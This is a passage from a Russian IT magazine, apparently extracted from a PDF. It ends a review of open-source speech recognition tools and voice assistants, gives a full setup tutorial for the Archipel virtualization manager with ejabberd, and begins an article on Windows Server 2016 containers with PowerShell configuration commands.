вать на практике. Причем не только на ПК, но и на мобильных устройствах.
К тому же движок очень хорошо работает с русской речью. При наличии пря-
мых рук и ясной головы можно настроить распознавание русской речи с по-
мощью Sphinx для управления домашней техникой или умным домом. По сути,
можно обычную квартиру превратить в умный дом, чем мы и займемся во вто-
рой части этого обзора. Реализации Sphinx имеются для Android, iOS и даже
Windows Phone. В отличие от облачного способа, когда работа по распозна-
ванию речи ложится на плечи серверов Google ASR или Яндекс SpeechKit,
Sphinx работает точнее, быстрее и дешевле. И полностью локально. При же-
лании можно научить Sphinx русской языковой модели и грамматике поль-
зовательских запросов. Да, придется немного потрудиться при установке.
Равно как и настройка голосовых моделей и библиотек Sphinx — занятие
не для новичков. Так как основа CMU Sphinx — библиотека Sphinx4 — напи-
сана на Java, можно включать ее код в свои приложения для распознавания
речи. Конкретные примеры использования будут описаны во второй части
нашего обзора.

VoxForge

Особо выделим понятие речевого корпуса. Речевой корпус — это структури-
рованное множество речевых фрагментов, которое обеспечено программны-
ми средствами доступа к отдельным элементам корпуса. Иными словами — это
набор человеческих голосов на разных языках. Без речевого корпуса невоз-
можна работа ни одной системы распознавания речи. В одиночку или даже не-
большим коллективом создать качественный открытый речевой корпус сложно,
поэтому сбором записей человеческих голосов занимается специальный про-
ект — VoxForge. Любой, у кого есть доступ к интернету, может поучаствовать
в создании речевого корпуса, просто записав и отправив фрагмент речи. Это
можно сделать даже по телефону, но удобней воспользоваться сайтом. Конеч-
но, кроме собственно аудиозаписи, речевой корпус должен включать в себя
дополнительную информацию, такую как фонетическая транскрипция. Без это-
го запись речи бессмысленна для системы распознавания.
VoxForge — стартовый портал для тех, кто хочет внести свой вклад
в разработку открытых систем распознавания речи

HTK, JULIUS И SIMON
HTK — Hidden Markov Model Toolkit — это инструментарий для исследования
и разработки средств распознавания речи с использованием скрытых мар-
ковских моделей, разрабатывается в Кембриджском университете под па-
тронажем Microsoft (Microsoft когда-то выкупила этот код у коммерческого
предприятия Entropic Cambridge Research Laboratory Ltd, а затем вернула его
Кембриджу вместе с ограничивающей лицензией). Исходники проекта доступ-
ны всем желающим, но использование кода HTK в продуктах, предназначен-
ных для конечных пользователей, запрещено лицензией. Однако это не озна-
чает, что HTK бесполезен для Linux-разработчиков: его можно использовать
как вспомогательный инструмент при разработке открытых (и коммерческих)
средств распознавания речи, что и делают разработчики открытого движка
Julius, который разрабатывается в Японии. Julius лучше всего работает с япон-
ским языком. Великий и могучий тоже не обделен, ведь в качестве голосовой
базы данных используется все тот же VoxForge.
   Возможности HTK и Julius активно используются в приложении Simon. Про-
ект запущен еще в 2007 году и до сих пор пребывает в перманентной бете. Дви-
жок использует библиотеки KDE, CMU Sphinx и/или Julius и акустические модели
проекта VoxForge. Есть версии для Windows и Linux. Разработка Simon ведется
в рамках проекта KDE в составе рабочей группы KDE Accessibility. Последняя
версия Simon — 0.4.1 — вполне себе юзабельное приложение для бета-версии.
  В Simon включены инструменты для создания голосовых и акустических мо-
делей, распознавания речи и организации управления голосом. Кроме управ-
ления десктопом, Simon может использоваться для аутентификации голосом,
голосового управления роботами и устройствами. Главный приоритет разра-
ботчики отдают предоставлению средств для работы на компьютере людей
с ограниченными возможностями.
  Помимо описанных выше, существуют и другие проекты по распознаванию
речи, такие как Kaldi, наработки которого используются сейчас в других проек-
тах. Однако в рамках данного обзора мы не будем их касаться. И дело не в том,
что они не заслуживают внимания, а в том, что большинство из них скорее
мертвы, чем живы. Более-менее активно развиваются лишь Sphinx и его про-
изводные, Simon, HTK и Julius. Смотри подробности на сайте Саймона.





Саймон говорит и выглядит довольно прилично


ЛУЧШИЕ ДРУЗЬЯ ЧЕЛОВЕКА
Голосовые ассистенты частично воплощают мечту создателей всех систем
для распознавания речи. Конечно, еще далеко до возможности полноценного
общения пользователя и искусственного интеллекта машины, но уже сегод-
ня можно искать информацию в интернете, запускать приложения, диктовать
текст, прокладывать маршруты, управлять кофеваркой и холодильником, пере-
писываться с друзьями в соцсетях и прочая, и прочая... Условно все голосовые
ассистенты можно разделить на две группы: те, которые так или иначе исполь-
зуют Google Voice API, и остальные. Остальные — это, например, ставшая уже
знаменитой Cortana от Microsoft, которая, по слухам, скоро станет доступна
для Android и iOS, что теоретически означает возможность портирования ее
и на чистый Linux-десктоп. Или Siri — детище Apple, которое яблочная компа-
ния оберегает от любого стороннего использования как зеницу ока.
   После открытия компанией Google своего API для работы с голосом персо-
нальные ассистенты для Linux начали появляться один за другим.





Вот правда. Именно так

LINUX SPEECH RECOGNITION
В начале 2013 года, после закрытого бета-тестирования был переведен в раз-
ряд свободных проект по созданию системы распознавания речевых команд
на базе Google Voice API. Система позволяет через управление голосом запу-
скать программы, выполнять операции с файлами, открывать сайты, находить
ответы на произвольные вопросы, создавать электронные письма, диктовать
текст документов, запускать приложения и так далее.
   Вначале проект развивался независимым энтузиастом для организации
речевого управления Ubuntu, но в текущем виде его код не привязан к особен-
ностям данной системы и может быть использован в любых дистрибутивах.
Код проекта написан на языке Python и открыт под лицензией GPLv3. Распоз-
навание речи реализовано через обращение к Google Voice API, который де-
монстрирует достаточно неплохие результаты для русского языка. Вся допол-
нительная инфа тут.





Можно установить в Ubuntu и пользоваться. Удобно, быстро


HOUND
Этот голосовой ассистент, хоть и создан для Android, а не для Linux, все же за-
служивает упоминания в нашем обзоре. Дело в том, что в тестах на распозна-
вание речи этот помощник обгоняет и Siri, и Google Now, справляясь с постав-
ленными задачами значительно эффективнее и быстрее. Самое ценное в нем
то, что он воспринимает фразы именно так, как пользователь их произносит, то
есть тебе не придется как-то специально формулировать свои вопросы, чтобы
ассистент их понял. Пока проект находится на стадии беты и доступен только
по инвайтам и только владельцам Android-девайсов, находящимся на террито-
рии США. Разработчики обещают выпустить версии для iOS после окончания
бета-тестирования. Будет ли версия для десктопов, пока неизвестно. Проект
развивается уже девять лет и, по словам разработчиков, достаточно стабилен
для повседневного использования. Русского языка, вестимо, нет.
   Как отмечает издание The Verge, Hound пока еще не может полностью за-
менить Google Now или Siri, из-за того что недостаточно «персонализирован».
Hound работает почти так же, как и Google Now, только лучше


BETTY
Это голосовой ассистент для консоли Linux. Он переводит английские слова
в команды в терминале и выполняет их. Если ты фанат тру-линукса, то это ре-
шение для тебя. Страница проекта на GitHub гласит: «Миссия Betty — в предо-
ставлении пользователю естественного языка общения с компьютером». Ведь
наверняка у тебя бывали ситуации, когда при работе в командной строке ты
не мог вспомнить синтаксис той или иной команды и лез в интернет за помо-
щью. С Betty такой проблемы больше не будет.
   Например, если ты забыл, как разархивировать файлы в терминале, тебе
достаточно сказать по-английски «Betty uncompress archive.tar.gz» («Бетти, раз-
архивируй файл archive.tar.gz»), и файл и правда разархивируется. Проверено
автором этой статьи.
   К сожалению, Betty пока не понимает русскую речь, да и набор команд у нее
довольно ограничен, но разработка идет уже больше двух лет, и довольно ак-
тивно, так что логично ожидать в будущем появление большего количества до-
ступных команд.
   Вот часть команд, которые Betty версии 0.1.8 понимает уже сейчас:
•  count (подсчет, например количества символов и слов в файле);
•  config (смена имени пользователя);
•  datetime (вывод текущего времени и даты);
•  поиск (внутри файлов);
•  web (запросы, скачивание файлов, поиск информации в Сети и прочее);
•  операции с папками и файлами (архивирование/разархивирование фай-
   лов, вычисление размера файлов, изменение прав доступа и другие);
•  пользовательские команды (вывод имени пользователя, IP-адреса, имена
   залогинившихся в машину пользователей и так далее).

Список команд постоянно увеличивается. Над проектом работает уже сем-
надцать разработчиков из пяти стран. Полный список команд Betty ты можешь
найти на странице проекта на GitHub.





Betty создана гиками для гиков. И работает, как гик

SIRIUS
Жемчужиной среди остальных можно назвать Sirius — новое и весьма амбици-
озное решение от группы разработчиков Clarity Lab из университета Мичигана.
Несмотря на сходство названия с Siri, проект не имеет с ней ничего общего.
Sirius уже может гораздо больше, чем его аналоги. Разработку Sirius взяли под
свое крыло Google, DARPA, ARM, министерство обороны США и Американ-
ский национальный научный фонд. Исходники распространяются под лицен-
зией BSD. Система основана на нескольких свободных проектах по распозна-
ванию речи, таких как Sphinx, Kaldi, Protobuf, Speeded Up Robust Features (SURF,
работает на базе OpenCV). Таким образом, в Sirius воплотилось все то лучшее,
что было разработано в сфере распознавания речи за последние 35 лет.
  В состав пакета входит приложение Sirius, которое можно установить
в Ubuntu, веб-фронтенд для браузера и набор базовых библиотек с реализа-
цией различных алгоритмов поиска и распознавания. В основном код написан
на С++, но для работы требуется много внешних компонентов на Java. В каче-
стве базы данных для формирования ответов используется Википедия,
а для распознавания речи — наработки проектов Sphinx, Kaldi и RASR. «Глав-
ное отличие нашей программы Sirius от ее коммерческих аналогов — она пол-
ностью бесплатна и может быть адаптирована под нужды пользователей», —
поясняет автор разработки Джейсон Марс (Jason Mars).
  Впервые Sirius продемонстрировали 14 марта 2015 года на технологиче-
ской конференции в Стамбуле. Выпуск программы состоялся на следующий
день. Sirius распознаёт не только речь, но и картинки и образы, а также по-
нимает естественный язык человека. Например, программе можно показать
фото любимого кафе и спро-
сить, во сколько оно закрывает-
ся. Главное отличие программы
от конкурентов заключается еще
и в том, что пользователь может
сделать  Sirius узкоспециализи-
рованным помощником. К при-
меру, для выдачи академических
консультаций ученому. Для ре-
ализации  этого  разработчики
начали сотрудничество с IBM.
«Фактически мы создали Linux
среди умных цифровых помощ-
ников», — утверждает Марс.
   Система вопросов и ответов
была    взята    из    проекта
OpenEphyra, а способность рас-
познавания изображений авторы
позаимствовали   у  алгоритма
SURF   компании   Qualcomm.
По мнению создателей Sirius, уже
к концу 2018 года доля голосовых
                                 Один из создателей Sirius Джейсон Марс
запросов превысит обычные тек-                                     уверен в будущем проекта
стовые запросы. Если разработчики не сбавят темпов и у них не иссякнет эн-
тузиазм, Sirius рискует стать лучшей в мире системой распознавания речи.
За новостями проекта можно следить на сайте Джейсона Марса.


ЗАКЛЮЧЕНИЕ
Такова ситуация с распознаванием речи в Linux в дан-
ный момент. Во второй части этого обзора мы попро-
буем использовать некоторые из описанных проектов                                  WWW
в повседневной работе на компьютере под управлени-
                                                                   Следи за новостямием Linux. Прежде всего нас интересует работа с русским
                                                                        распознавания речи
языком и голосовые команды для управления домаш-
ней электроникой. Получится ли превратить обычную    Скачать Sirius бесплатно
квартиру в «умную» — узнаешь в следующей части.          без регистрации и СМС
SYNACK

ВИДИМОСТЬ НУЛЬ,
ИДЕМ ПО ПРИБОРАМ
        СИСТЕМА УПРАВЛЕНИЯ
       ВИРТУАЛИЗАЦИЕЙ ARCHIPEL





                                        Александр «Plus» Рак
                                                 plus@omsklug.com
                                                 Участник сообщества
                                         OmskLUG. Руководитель
                                              группы автоматизации
                                               отдела ИТ департамента
                                               образования города
                                                  Салехард
Сегодня на просторах интернета можно найти огром-
ное количество решений для управления виртуализаци-
ей от коробочных до панельных версий. Одни ставятся
вместе с системой, другие «наворачиваются» отдельно.
Среди них есть с виду обычная система управления вир-
туальными узлами Archipel от французского программиста
Антуана Меркадаля (Antoine Mercadal). Первые версии
были доступны в ISO-образе. Скачал, поставил и забыл.
Образы были нескольких вариантов, на базе CentOS и на
базе Fedora. Сейчас Archipel доступен в репозитори-
ях Ubuntu начиная с 14.04 LTS, на более ранних версиях
не тестировалось. Также на сайте разработчика доступен
образ ANSOS (Archipel Node Stateless OS).

Почему среди всех выделил именно эту систему? Да просто у нее есть одно
существенное отличие, которое для меня показалось очень удобным и гиб-
ким в работе решением. Эта система обменивается командами на базе про-
токола XMPP, что позволяет мгновенно реагировать на изменения состояния
системы. То есть все ответы виртуальных узлов или систем сразу появляются
в веб-клиенте! Представь, какие удобные инструменты добавляются в мес-
сенджере. Хоть с самим гипервизором, хоть с виртуалками отдельно можно
в прямом смысле «разговаривать», обмениваясь сообщениями! Также доступ-
на традиционная веб-панель. Archipel-агент может быть установлен практиче-
ски на все гипервизоры KVM, QEMU, VMware, Xen, OpenVZ.

ИТАК, ПЛАНЫ НА СЕГОДНЯ!
1. Установка системы управления Archipel.
2. Краткий экскурс по веб-панели управления Archipel.

УСТАНОВКА И НАСТРОЙКА
Нам дано:
•  установленная версия Ubuntu 12.04;
•  утилиты для организации сетевого моста;
•  настроенный сетевой мост на одном из интерфейсов.

Итак, имеем Ubuntu Server. Первым делом надо установить ejabberd-сервер
(как мы помним, Archipel взаимодействует с пользователем через XMPP-про-
токол). Устанавливать будем из стандартных репозиториев Ubuntu.
$ sudo apt-get install ejabberd

Далее переходим к настройке. Конфиг для ejabberd можно найти на сайте
archipelproject.org, в разделе документации, а исправленный конфиг смотри
в дополнительных материалах к этой статье.

Мысли вслух

Конечно, никто не запрещает использовать публичные серверы XMPP вместо
того, чтобы настраивать свой. Однако, как ты, уважаемый читатель, понима-
ешь, безопасность в этом случае очень и очень страдает. Например, некото-
рых никогда не покидает чувство «они везде, они следят за нами». А вот если
в арсенале имеются несколько серверов с виртуализацией, тогда достаточно
поднять один Jabber-сервер. У некоторых пользователей встречал даже такую
настройку: стоял сервер виртуализации на Ubuntu, а внутри маленькая вирту-
алка с Jabber-сервером. И уже этот самый джаббер обслуживает управлялку
Archipel. В этом случае стоит понимать, что, как только отвалится виртуалка,
доступ к управлению через Archipel сразу пропадет тоже.



Меняем параметры IP-адреса и FQDN на свои. Перезапускаем ejabberd:

# service ejabberd restart

Если все прошло хорошо, то движемся дальше. Если нет, идем курить логи
и исправлять ошибки. Далее делаем необходимые записи в файле /etc/hosts
на нашем компе или поднимаем DNS-сервер, добавляем нужную зону, пропи-
сываем необходимые А-записи и запись в FQDN типа

X.X.X.X    your.fqdn.com

Далее создаем необходимые сертификаты для SSL:

# openssl req -new -x509 -newkey rsa:1024 -days 3650
    -keyout /etc/ejabberd/privkey.pem -out /etc/ejabberd/ejabberd.pem
# openssl rsa -in /etc/ejabberd/privkey.pem
    -out /etc/ejabberd/privkey.pem
# cat /etc/ejabberd/privkey.pem >> /etc/ejabberd/ejabberd.pem
# rm /etc/ejabberd/privkey.pem

Перезапускаем ejabberd. Опять-таки, если не запускается, смотрим логи. Если
все о’кей, идем дальше. Следующим шагом нужно установить агент Archipel
и веб-клиент. Веб-клиент — это обычное веб-приложение, для его работы под-
нимаем любой из удобных веб-серверов, на этом или любом другом сервере.
   Агент Archipel устанавливается несколькими путями: из репозитория Python
или из исходного кода стягиванием с GitHub. С Гитхаба вот таким образом:

# git clone https://github.com/ArchipelProject/Archipel.git
# cd /path/to/clone/Archipel/
# ./pull.sh

Через Python установку провести можно вот так:

# easy_install apscheduler==2.1.2 sqlalchemy numpy
# cd /path/ArchipelAgent/
# ./buildAgent -d

Или можно тупо стянуть последнюю ТЕСТИРУЕМУЮ версию архивом:

# wget http://nightlies.archipelproject.org/latest-archipel-
    agent.tar.gz
# tar xvf latest-archipel-agent.tar.gz -C /path/to/untar/

Для завершения установки запускаем

# archipel-initinstall

Теперь необходимо создать пользователя Jabber с правами админа гиперви-
зора:

# archipel-tagnode --jid=admin@FQDN --password=YOURPASSWORD
    --create
# archipel-rolesnode --jid=admin@FQDN --password=YOURPASSWORD
    --create
# archipel-adminaccounts --jid=admin@FQDN --password=YOURPASSWORD
    --create

Здесь меняем учетные данные на свои, где
•  admin — имя пользователя;
• FQDN — полное хостовое имя Jabber-сервера или домена, на который
   Jabber-сервер настроен;
• YOURPASSWORD — твой придуманный пароль.

Теперь можно рестартнуть Archipel и убедиться, что все запустилось без
ошибок:

# service archipel restart

Проверяем, подключился ли пользователь «гипервизор» к Jabber-серверу:

# ejabberdctl connected_users

Если все прошло хорошо, то в списке подключенных пользователей увидим
агент, например:

1e96182c-3231-4054-ac3d-338b1b364fe4@hyper.local/hyper.local

Изменить учетные данные агента можно в файле /etc/archipel/archipel.conf,
а также можно изменить имя администратора агента, которому разрешены все
права, сменить-IP адрес, задать каталог хранения виртуальных машин и про-
чее.

# General configuration. You should just need to edit these values
#
[DEFAULT]
xmpp_server                 = hyper.local # адрес домена
                                jabber-сервера
archipel_folder_lib         = /var/lib/archipel/ # каталог archipel
archipel_general_uuid       = 1e96182c-3231-4054-ac3d-338b1b364fe4
                              # Имя (адрес) гипервизора—пользователя
                                Jabber-сервера
archipel_folder_data        = /var/vm/ # Каталог, в котором хранятся
                                виртуалки по умолчанию
[GLOBAL]
archipel_root_admins        = admin@%(xmpp_server)s # Имя
                                администратора Jabber-сервера
machine_ip                  = 192.168.254.222 # IP-адрес машины
                                гипервизора
use_avatar                  = True # Использование аватаров
# Данные vcard гипервизора
[VCARD]
orgname                     = Archipel Corp
orgunit                     = Dev
userid                      = contact@archipelproject.org
locality                    = San Francisco
url                         = http://archipelproject.org
categories                  = Archipel

После успешного запуска проверяем тест XMPP-сервера службами Archipel:

# archipel-testxmppserver --jid=admin@FQDN --password=YOURPASSWORD

Здесь нужно отметить, что для работы системы успешный тест должен быть
для первых четырех пунктов, для остальных некритично. Обновление агента
можно проводить через

# easy_install -U archipel-agent
# /etc/init.d/archipel restart

Или из исходного кода:

# git pull
# /etc/init.d/archipel restart

Оригинальная инструкция доступна на официальном сайте проекта.

СОЗДАЕМ ВИРТУАЛКИ
Если все хорошо прошло, агент запущен, веб-клиент установлен, тогда захо-
дим по адресу веб-клиента браузером и наблюдаем страничку авторизации.





Окно авторизации Archipel
   Логинимся под созданной учетной записью. И видим, что у нас ничего нет:
нужно добавить пользователя гипервизора в список. Жмем на знак + в ниж-
нем левом углу, выбираем «Добавить контакт». В поле JID вставляем JID ги-
первизора (в моем случае это 1e96182c-3231-4054-ac3d-338b1b364fe4@hyper.
local/hyper.local), Nichname задаем произвольно, главное, не забудь, что
это гипервизор. После успешного добавления можно создать группы, чтобы
удобнее расположить виртуальные узлы. После чего, кликнув по гипервизору,
можно увидеть состояние сервера.





Состояние сервера

Здесь отображаются такие данные, как нагрузка на проц, свободное количе-
ство оперативной памяти, использование раздела подкачки, Uptime, данные
о версиях ПО. Ниже идут графики загрузки процессора, нагрузки на сетевые
интерфейсы, использование памяти, состояние накопителей и свободное ме-
сто на них.
   Переходим в раздел Virtual Machines. Здесь, собственно, и создаются вир-
туальные машины. Кликаем по знаку + и заполняем все данные. Теперь под-
ключим к нашей ВМ образы жестких дисков и сетевой интерфейс. Выбираем
виртуальную машину из списка слева (поместить ее в группу можно, перета-
щив мышью в группу или подгруппу). Переходим в раздел Disks, жмем «Доба-
вить» (+) и заполняем необходимые данные.
Создание образа жесткого диска

После этого он появится в списке жестких дисков, доступных для этого вир-
туального узла, дальше его необходимо подключить. Переходим в раздел
Definition, подраздел Virtual Medias, и добавляем. Здесь можно выбрать тип
подключения, тип диска, исходные путь подключения и сам диск. Чтобы доба-
вить ISO-образы, их предварительно необходимо сложить в каталог /var/vm/
iso. Далее сменить тип с disk на cdrom.





Добавление ISO-образа
Следующим шагом нужно добавить сетевой интерфейс. Переходим в подраз-
дел Virtual Nics. Жмем + для добавления, выбираем сетевой мост и имя се-
тевого моста, которое ты задал при настройке сетевых параметров сервера
в самом начале. Если в системе всего один сетевой мост, то он сразу будет
доступен и выбирается по умолчанию. Остальные параметры не меняем.





Подключение сетевого интерфейса

Чуть не забыл, в подразделе Basics задаем количество оперативной памя-
ти, выделяемое для виртуальной машины, и количество ядер процессора.
Также можно задать порядок загрузки, время, поведение при выключениях
и перезагрузках, параметры проброса USB-устройств, тип виртуальной ма-
шины: QEMU или KVM, версию виртуальной машины, параметры подключе-
ния к устройствам ввода-вывода. Этих параметров достаточно для запуска
виртуального узла. После этого у тебя статус виртуальной машины изменится
на Off. Запускаем ее клавишей Run в верхнем меню. Для подключения к экрану
жмем screen и можем видеть монитор виртуального узла. В одной из предыду-
щих статей мы настраивали PXE-загрузку, поэтому у меня на скрине то самое
PXE-меню. :)
Подключение к монитору виртуального узла

Также система позволяет распределять права доступа. Создаем пользова-
теля Jabber, добавляем в список, введя его JID. Дальше выбираем виртуаль-
ный узел, к которому необходимо предоставить доступ. Переходим во вкладку
Permissions.





Настройка прав доступа
Далее, если у тебя есть еще один сервер с виртуализацией, ты можешь устано-
вить на него Archipel-агент, на сервере Jabber создать пользователя для второ-
го гипервизора, в параметрах /etc/archipel/archipel.conf второго сервера
ввести учетные данные и управлять обоими серверами с одного веб-клиента
Archipel. В этом случае будет доступна миграция виртуалок между серверами.





Окно миграции между серверами Archipel

ЧАТИМСЯ С ВИРТУАЛКАМИ
Ну и наконец, самое вкусное, или основная особенность всей этой систе-
мы, — управление виртуальными узлами через Jabber-сообщения с любого
IM-клиента. Пример на встроенном в веб-клиент мессенджере. Выбираем
виртуальную машину, переходим в раздел Chat. Для списка доступных команд
вводим help.
Общение с виртуальным узлом через сообщения

Изменить пароль текущей учетной записи прямо из веб-клиента Archipel мож-
но в верхнем меню Archipel → XMPP Account. Также в нем доступно управление
контактами и группами. Если ты планируешь использовать Archipel как много-
пользовательский  сервер,  то здесь еще  есть возможность проводить
Jabber-конференции прямо из веб-клиента или подключиться к конференции
технической поддержки проекта.
   Нельзя не отметить и создание отпечатков жестких дис-
ков — Snapshots, особенно в тестовых виртуальных узлах
при отладке того или иного приложения. Здесь это делает-
ся очень удобно и быстро: жмешь «Создать» в специальном
разделе Snapshots и ждешь результат.
   Аналогично можно подключаться с любого другого кли-
ента на любом другом устройстве. Особенно актуально    WWW
для виртуальных узлов в ОС Windows, если «что-то пошло
                                                                     Официальный сайтне так». Также при установке Archipel на действующий сер-
                                                                                                 Archipelвер виртуальных машин система обнаружит их автомати-
чески и предложит добавить в список виртуальных узлов.
                                                                               Статья о QEMU +Из недостатков можно выделить то, что веб-клиент пол-
                                                            KVM и способахностью на английском языке, но доступны исходные коды
                                                                               управлениядля локализации. Если кому-то это жизненно необходимо,
могу помочь с этим. Сам использую версию на английском
языке.
  Из опыта работы с виртуальными машинами скажу, что среди массы ре-
шений, которые я пробовал (OpenNebula, Karesansui KVM, Proxmox, Xen Server,
KVM голый + virt-manager, Hyper-V и еще ряд других), Archipel показался наи-
более удобным, и им я и пользуюсь. Также еще установлен OpenNebula, его
используем для выделения виртуальных узлов подведомственным учрежде-
ниям для своих нужд. OpenNebula удобна тем, что у нее в наборе есть готовые
виртуалки — шаблоны. Но это уже совсем другая история.

ПОДВЕДЕМ ИТОГИ
Мы разобрались с установкой и настройкой системы управления виртуализа-
цией Archipel. Быстро пробежались по основным инструментам управления.
Научились «разговаривать» с виртуальными узлами. Краем глаза посмотрели
на миграцию между серверами Archipel (как появится второй большой сер-
вер, сразу сделаю обзор на эту тему). Считаю систему очень удобной и весьма
рекомендую.
SYNACK
ПАКУЕМ





 ИЗУЧАЕМ ТЕХНОЛОГИЮОКНА
 КОНТЕЙНЕРОВ MS





          Мартин
          «urban.prankster»
         Пранкевич
      prank.urban@gmail.com
В *nix-системах изначально реализована многоза-
дачность и предлагаются средства, позволяющие
изолировать и контролировать процессы. Такие тех-
нологии, как chroot(), обеспечивающая изоляцию
на уровне файловой системы, FreeBSD Jail, ограни-
чивающая доступ к структурам ядра, LXC и OpenVZ,
давно известны и широко используются. Но импуль-
сом в развитии технологии стал Docker, позволивший
удобно распространять приложения. Теперь подоб-
ное добралось и до Windows.

КОНТЕЙНЕРЫ В WINDOWS
Современные серверы обладают избыточной производительностью, и при-
ложения порой не используют даже их части. В результате системы какое-то
время «простаивают», нагревая воздух. Выходом стала виртуализация, позво-
ляющая запускать несколько ОС на одном сервере, гарантированно разделяя
их между собой и выделяя каждой нужное количество ресурсов. Но прогресс
не стоит на месте. Следующий этап — микросервисы, когда каждая часть при-
ложения развертывается отдельно, как самодостаточный компонент, который
легко масштабируется под нужную нагрузку и обновляется. Изоляция предот-
вращает вмешательство в работу микросервиса со стороны других приложе-
ний. С появлением проекта Docker, упростившего процесс упаковки и достав-
ки приложений вместе с окружением, архитектура микросервисов получила
дополнительный толчок в развитии.
   Контейнеры — это иной тип виртуализации, предоставляющий обосо-
бленную среду для выполнения приложений, называемую OS Virtualization.
Реализуются контейнеры за счет использования изолированного простран-
ства имен, включающего все необходимые для работы ресурсы (виртуали-
зированные имена), с которыми можно взаимодействовать (файлы, сетевые
порты, процессы и прочее) и выйти за которые нельзя. То есть ОС показывает
контейнеру только то, что выделено. Приложение внутри контейнера считает,
что оно единственное, и работает в полноценной ОС без каких-либо ограни-
чений. Если необходимо изменить существующий файл или создать новый,
контейнер получает копии с основной ОС хоста, сохраняя только изменен-
ные участки. Поэтому развертывание нескольких контейнеров на одном хо-
сте очень эффективно.
   Отличие контейнеров от виртуальных машин заключается в том, что кон-
тейнеры не загружают собственные копии ОС, библиотеки, системные файлы
и прочее. Операционная система как бы делится с контейнером. Единствен-
ное, что дополнительно требуется, — это ресурсы, необходимые для запуска
приложения в контейнере. В результате контейнер стартует в считаные секун-
ды и меньше нагружает систему, чем в случае применения виртуальных машин.
Docker в настоящее время предлагает 180 тысяч приложений в репозитории,
а формат унифицирован в Open Container Initiative (OCI). Но зависимость от ядра
подразумевает, что в другой ОС контейнеры не будут работать. Контейнеры
Linux требуют Linux API, соответственно Windows в Linux работать не станет.
   Разработчики Windows до недавнего времени предлагали две технологии
виртуализации: виртуальные машины и виртуальные приложения Server App-V.
Каждая имеет свою нишу применения, свои плюсы и минусы. Теперь ассорти-
мент стал шире — в Windows Server 2016 анонсированы контейнеры (Windows
Server Containers). И хотя на момент TP4 разработка еще не была завершена,
уже вполне можно посмотреть новую технологию в действии и сделать выво-
ды. Нужно отметить, что, догоняя и имея на руках готовые технологии, разра-
ботчики MS пошли в некоторых вопросах чуть дальше, так что использование
контейнеров стало проще и более универсальным. Главное отличие в том, что
предложены два вида контейнеров: контейнеры Windows и контейнеры Hyper-V.
В TP3 были доступны только первые.
   Контейнеры Windows используют одно ядро с ОС, которое динамично раз-
деляют между собой. Процесс распределения (CPU, ОЗУ, сеть) берет на себя
ОС. При необходимости можно ограничить максимально доступные ресур-
сы, выделяемые контейнеру. Файлы ОС и запущенные службы проецируются
в пространство имен каждого контейнера. Такой тип контейнера эффективно
использует ресурсы, уменьшая накладные расходы, а значит, позволяет более
плотно размещать приложения. Этот режим в чем-то напоминает FreeBSD Jail
или Linux OpenVZ.
   Контейнеры Hyper-V обеспечивают дополнительный уровень изоляции
при помощи Hyper-V. Каждому контейнеру выделяется свое ядро и память, изо-
ляцию осуществляет не ядро ОС, а гипервизор Hyper-V. В результате достига-
ется такой же уровень изоляции, как и в виртуальных машинах, при меньших
накладных расходах по сравнению с VM, но больший, если сравнить с контей-
нерами Windows. Для использования такого вида контейнеров нужно уста-
новить на хосте роль Hyper-V. Контейнеры Windows больше подходят для ис-
пользования в доверенной среде, например когда на сервере запускаются
приложения одной организации. Когда же сервером пользуются множество
компаний и необходимо обеспечить больший уровень изоляции, контейнеры
Hyper-V, вероятно, будут более рациональны.
  Важная особенность контейнеров в Win 2016 состоит в том, что тип выби-
рается не в момент создания, а в момент деплоя. То есть любой контейнер
может быть запущен и как Windows, и как Hyper-V.
  В Win 2016 за контейнеры отвечает слой абстракции Contаiner Management
stack, реализующий все нужные функции. Для хранения используется формат
образа жесткого диска VHDX. Контейнеры, как и в случае с Docker, сохраняют-
ся в образы в репозитории. Причем каждый сохраняет не полный набор дан-
ных, а только отличия создаваемого образа от базового, и в момент запуска
все нужные данные проецируются в память. Для управления сетевым трафи-
ком между контейнером и физической сетью служит Virtual Switch.
  В качестве ОС в контейнере может использоваться Server Core или Nano
Server. Первый, в общем-то, давно не новинка и обеспечивает высокий уро-
вень совместимости с имеющимися приложениями. Второй — еще более
урезанная версия для работы без монитора, позволяющая запускать сервер
в минимально возможной конфигурации для использования с Hyper-V, файло-
вым сервером (SOFS) и облачными службами. Графический интерфейс, есте-
ственно, отсутствует. Содержит только самые необходимые компоненты (.NET
с CoreCLR, Hyper-V, Clustering и так далее). Но в итоге занимает на 93% меньше
места, требует меньше критических исправлений.
  Еще интересный момент. Для управления контейнерами, кроме традици-
онного PowerShell, можно использовать и Docker. И чтобы обеспечить возмож-
ность запуска неродных утилит на Win, MS заключила партнерское соглашение
для расширения API Docker и набора инструментов. Все разработки открыты
и доступны в официальном GitHub проекта Docker. Команды управления Docker
применимы ко всем контейнерам как Win, так и Linux. Хотя, естественно, кон-
тейнер, созданный на Linux, запустить в Windows невозможно (как и наоборот).
В настоящий момент PowerShell по функциям ограничен и позволяет работать
только с локальным репозиторием.

УСТАНОВКА CONTAINERS
В Azure есть необходимый образ Windows Server 2016 Core with Containers
Tech Preview 4, который можно развернуть и использовать для изучения кон-
тейнеров. Иначе необходимо все настроить самому. Для локальной установки
нужен Win 2016, причем, так как Hyper-V в Win 2016 поддерживает вложенную
виртуализацию (Nested virtualization), это может быть как физический, так и вир-
туальный сервер. Сам процесс установки компонента стандартен. Выбираем
соответствующий пункт в мастере добавления ролей и компонентов или, ис-
пользуя PowerShell, даем команду

PS> Install-WindowsFeature Containers
Установка компонента Containers в диспетчере серверов

В процессе установится и сетевой контроллер Virtual Switch. Его сразу необ-
ходимо настроить, иначе дальнейшие действия будут выдавать ошибку. Смо-
трим названия сетевых адаптеров:

PS> Get-NetAdapter

Для работы нам нужен контроллер с типом External. У командлета New-VMSwitch
много параметров, но для примера обойдемся минимальными установками:

PS> New-VMSwitch -Name External -NetAdapterName Ethernet0

Проверяем:

PS> Get-VMSwitch | where {$_.SwitchType –eq “External”}
Настройка Virtual Switch

Файрвол Windows будет блокировать соединения к контейнеру. Поэтому не-
обходимо создать разрешающее правило, как минимум для возможности
подключаться удаленно при помощи PowerShell remoting, для этого разрешим
TCP/80 и создадим правило NAT:

PS> New-NetFirewallRule -Name “TCP80” -DisplayName “HTTP on TCP/80”
    -Protocol tcp -LocalPort 80 -Action Allow -Enabled True
PS> Add-NetNatStaticMapping -NatName “ContainerNat” -Protocol TCP
    -ExternalIPAddress 0.0.0.0 -InternalIPAddress 192.168.1.2
    -InternalPort 80 -ExternalPort 80

Есть еще один вариант простого развертывания. Разработчики приготовили
